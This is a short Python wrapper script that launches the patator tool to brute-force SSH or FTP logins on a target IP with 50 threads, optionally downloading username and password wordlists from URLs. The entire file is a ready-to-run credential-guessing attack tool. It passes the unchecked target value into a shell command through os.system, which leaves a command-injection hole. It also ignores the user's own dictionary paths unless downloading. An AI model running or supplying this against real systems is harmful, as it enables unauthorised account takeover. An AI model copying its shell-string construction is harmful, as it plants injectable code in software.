import os
import argparse
import validators
import urllib.request

def main(args):
    if args.download:
        if validators.url(args.username_dict):
            print("Downloading username dictionary")
            urllib.request.urlretrieve(args.username_dict, "/tmp/usernames.txt")
            args.username_dict = "/tmp/usernames.txt"
        if validators.url(args.password_dict):
            print("Downloading password dictionary")
            urllib.request.urlretrieve(args.password_dict, "/tmp/passwords.txt")
            args.password_dict = "/tmp/passwords.txt"

    # execute the attack
    print("Executing patator")
    attack_command = "python3 patator.py "
    if args.attack_mode == "SSH":
        attack_command += "ssh_login"
    else:
        attack_command += "ftp_login"
    attack_command += " host=" + args.target + " user=FILE0 password=FILE1 0=/tmp/usernames.txt 1=/tmp/passwords.txt --threads 50"
    
    print(attack_command)
    os.system(attack_command)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="python3 run.py")
    parser.add_argument("attack_mode", choices=["FTP", "SSH"], default="SSH", help="Type of bruteforce to run, FTP or SSH (default: SSH)")
    parser.add_argument("target", help="IP of the target to attack")
    parser.add_argument("-d", "--download", action="store_true", help="Download the list from the url specified in the username and password dictionaries")
    parser.add_argument("-u", "--username_dict", default="/files/usernames.txt", help="Path to dictionary of usernames to attempt. Can be a link (use -d to download the list)")
    parser.add_argument("-p", "--password_dict", default="/files/passwords.txt", help="Path to dictionary of passwords to attempt. Can be a link (use -d to download the list)")

    args = parser.parse_args()
    main(args)